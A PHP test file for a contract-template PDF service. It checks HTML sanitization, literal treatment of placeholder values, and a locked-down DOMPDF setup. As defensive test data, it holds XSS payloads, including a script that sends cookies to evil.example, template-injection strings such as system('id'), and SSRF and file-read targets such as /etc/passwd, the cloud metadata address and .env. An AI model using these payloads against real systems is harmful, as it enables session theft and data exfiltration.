<?php

use App\Models\TemplateVersion;
use App\Services\Templates\HtmlPdfRenderer;
use App\Services\Templates\HtmlSanitizer;
use App\Services\Templates\PlaceholderEngine;
use App\Services\Templates\TemplateDocumentRenderer;
use App\Services\Templates\VariableValues;
use Tests\Feature\Pdf\Support\PdfFixtures;

require_once __DIR__.'/Support/TemplateHelpers.php';

beforeEach(function () {
    $this->work = templatesWorkspace();
    ['organization' => $this->organization, 'owner' => $this->owner] = createOrganizationWithOwner();
    templatesEnable($this->organization);
    actingAsMember($this->owner, $this->organization);
});

afterEach(fn () => PdfFixtures::cleanup($this->work ?? null));

describe('sanitização do HTML do modelo', function () {
    test('remove script, iframe, eventos on*, javascript:, CSS com url(), <style>, <link>, <img> e comentários', function () {
        $dirty = <<<'HTML'
            <h1 onclick="alert(1)">Contrato</h1>
            <script>fetch('https://evil.example/'+document.cookie)</script>
            <iframe src="https://evil.example"></iframe>
            <p style="color: red; background-image: url(http://evil.example/x.png); position: fixed">Texto <b onmouseover="x()">forte</b></p>
            <a href="javascript:alert(1)">clique</a>
            <img src="http://evil.example/pixel.png" onerror="alert(1)">
            <style>@import url(http://evil.example/a.css);</style>
            <link rel="stylesheet" href="http://evil.example/a.css">
            <svg><script>alert(1)</script></svg>
            <object data="http://evil.example/x.swf"></object>
            <!-- comentário com {{segredo}} -->
            <table border="1"><tr><td colspan="2" onclick="x()">célula</td></tr></table>
            <form action="https://evil.example"><input name="senha"></form>
            <p style="width: expression(alert(1))">IE</p>
            HTML;

        $clean = app(HtmlSanitizer::class)->sanitize($dirty);

        expect($clean)
            ->not->toContain('<script')
            ->not->toContain('<iframe')
            ->not->toContain('onclick')
            ->not->toContain('onmouseover')
            ->not->toContain('onerror')
            ->not->toContain('javascript:')
            ->not->toContain('url(')
            ->not->toContain('<style')
            ->not->toContain('<link')
            ->not->toContain('<img')
            ->not->toContain('<svg')
            ->not->toContain('<object')
            ->not->toContain('<form')
            ->not->toContain('<input')
            ->not->toContain('evil.example')
            ->not->toContain('segredo')
            ->not->toContain('position')
            ->not->toContain('expression')
            ->not->toContain('href')
            ->toContain('<h1>Contrato</h1>')
            ->toContain('style="color: red"')
            ->toContain('<b>forte</b>')
            ->toContain('clique')
            ->toContain('<td colspan="2">célula</td>')
            ->toContain('<table border="1">');
    });

    test('o HTML salvo no modelo já é o sanitizado', function () {
        $template = templateHtml($this->organization, $this->owner, '<p onclick="x()">Olá {{nome}}</p><script>alert(1)</script>', [
            ['key' => 'nome', 'label' => 'Nome', 'type' => 'text', 'required' => true],
        ]);

        $html = (string) $template->currentVersion->html_body;

        expect($html)->toBe('<p>Olá {{nome}}</p>');
    });

    test('marcador com expressão (estilo Blade) no modelo é recusado ao salvar', function () {
        $template = templateHtml($this->organization, $this->owner, '<p>{{nome}}</p>', [
            ['key' => 'nome', 'label' => 'Nome', 'type' => 'text', 'required' => true],
        ]);

        $this->put(route('templates.update', $template), [
            'html_body' => '<p>{{nome}} — {{ 7*7 }} — {{ $user->password }}</p>',
            'variables' => [['key' => 'nome', 'label' => 'Nome', 'type' => 'text', 'required' => true]],
            'roles' => [['ref' => 'r1', 'name' => 'Locatário', 'participant_role' => 'signer']],
        ])->assertSessionHasErrors('html_body');

        expect($template->fresh()->currentVersion->version_number)->toBe(2);
    });

    test('marcador não declarado é recusado ao salvar', function () {
        $template = templateHtml($this->organization, $this->owner, '<p>{{nome}}</p>', [
            ['key' => 'nome', 'label' => 'Nome', 'type' => 'text', 'required' => true],
        ]);

        $this->put(route('templates.update', $template), [
            'html_body' => '<p>{{nome}} {{nao_declarada}}</p>',
            'variables' => [['key' => 'nome', 'label' => 'Nome', 'type' => 'text', 'required' => true]],
            'roles' => [['ref' => 'r1', 'name' => 'Locatário', 'participant_role' => 'signer']],
        ])->assertSessionHasErrors(['html_body' => 'Declare as variáveis usadas no texto: nao_declarada.']);
    });
});

describe('valores de variáveis são texto literal', function () {
    test('Blade, PHP, script e marcadores no VALOR aparecem escapados e nunca são executados nem reexpandidos', function () {
        $template = templateHtml($this->organization, $this->owner, '<p>A: {{campo_a}}</p><p>B: {{campo_b}}</p>', [
            ['key' => 'campo_a', 'label' => 'Campo A', 'type' => 'long_text', 'required' => true],
            ['key' => 'campo_b', 'label' => 'Campo B', 'type' => 'text', 'required' => true],
        ]);

        /** @var TemplateVersion $version */
        $version = $template->currentVersion()->with('variables')->first();
        $renderer = app(TemplateDocumentRenderer::class);

        $values = app(VariableValues::class)->validate($version->variables, [
            'campo_a' => "<script>alert('x')</script> {{campo_b}} @php system('id') @endphp {{ 7*7 }} <?php echo 1; ?> \${campo_b}",
            'campo_b' => 'SEGREDO_DO_B',
        ]);

        $body = $renderer->htmlBody($version, $renderer->formatted($version, $values));

        expect($body)
            ->toContain('&lt;script&gt;alert(&apos;x&apos;)&lt;/script&gt;')
            ->toContain('{{campo_b}}')
            ->toContain('@php system(&apos;id&apos;) @endphp')
            ->toContain('{{ 7*7 }}')
            ->toContain('&lt;?php echo 1; ?&gt;')
            ->toContain('${campo_b}')
            ->not->toContain('<script')
            ->not->toContain('49')
            // O valor de campo_b aparece UMA vez: no lugar dele, nunca dentro de campo_a.
            ->and(substr_count($body, 'SEGREDO_DO_B'))->toBe(1);
    });

    test('o motor só conhece {{chave}}: nenhuma outra sintaxe é interpretada', function () {
        $html = '<p>{{nome}} {{ nome }} {{Nome}} {{ nome|upper }} {!! nome !!} @{{ nome }}</p>';

        $rendered = PlaceholderEngine::renderHtml($html, ['nome' => 'Ana & Cia']);

        expect($rendered)->toBe('<p>Ana &amp; Cia Ana &amp; Cia {{Nome}} {{ nome|upper }} {!! nome !!} @Ana &amp; Cia</p>')
            ->and(PlaceholderEngine::scanHtml($html)['invalid'])->toBe(['{{Nome}}', '{{nome|upper}}']);
    });
});

describe('DOMPDF trancado', function () {
    test('configuração efetiva: sem rede, sem file://, sem PHP, sem JavaScript, chroot vazio', function () {
        $pdf = app(HtmlPdfRenderer::class)->make('<p>teste</p>');
        $options = $pdf->getDomPDF()->getOptions();

        $protocols = $options->getAllowedProtocols();

        expect($options->getIsRemoteEnabled())->toBeFalse()
            ->and($options->getIsPhpEnabled())->toBeFalse()
            ->and($options->getIsJavascriptEnabled())->toBeFalse()
            ->and(array_keys($protocols))->toBe(['data://', 'file://', 'http://', 'https://'])
            ->and($protocols['data://']['rules'])->toBe([])
            ->and($options->getChroot())->toBe([storage_path('app/tmp/template-html-jail')]);

        // Toda regra de file/http/https recusa qualquer endereço.
        foreach (['file://', 'http://', 'https://'] as $protocol) {
            expect($protocols[$protocol]['rules'])->toHaveCount(1);

            foreach (['file:///etc/passwd', 'http://169.254.169.254/latest/meta-data', 'https://example.com/a.png'] as $uri) {
                expect(($protocols[$protocol]['rules'][0])($uri)[0])->toBeFalse();
            }
        }
    });

    test('não busca recurso remoto nem com HTML hostil que escapasse da sanitização', function () {
        $server = stream_socket_server('tcp://127.0.0.1:0', $errno, $error);
        expect($server)->not->toBeFalse();
        stream_set_blocking($server, false);
        $address = (string) stream_socket_get_name($server, false);

        $hostile = '<html><head><link rel="stylesheet" href="http://'.$address.'/a.css">'
            .'<style>@import url(http://'.$address.'/b.css); body { background: url(http://'.$address.'/c.png); }</style></head>'
            .'<body><img src="http://'.$address.'/pixel.png"><img src="https://'.$address.'/s.png">'
            .'<div style="background-image: url(http://'.$address.'/d.png)">x</div>'
            .'<img src="file:///'.str_replace('\\', '/', base_path('.env')).'"></body></html>';

        $bytes = app(HtmlPdfRenderer::class)->render($hostile);

        $connection = @stream_socket_accept($server, 0.5);

        expect($bytes)->toStartWith('%PDF')
            ->and($connection)->toBeFalse();

        fclose($server);
    });

    test('a pré-visualização do modelo HTML devolve um PDF gerado com valores de exemplo', function () {
        $template = templateHtml($this->organization, $this->owner, '<h1>Recibo</h1><p>Valor: {{valor}}</p>', [
            ['key' => 'valor', 'label' => 'Valor', 'type' => 'currency', 'required' => true, 'default_value' => '1500'],
        ]);

        $response = $this->get(route('templates.preview', $template));

        $response->assertOk()->assertHeader('Content-Type', 'application/pdf');
        expect((string) $response->getContent())->toStartWith('%PDF');
    });
});
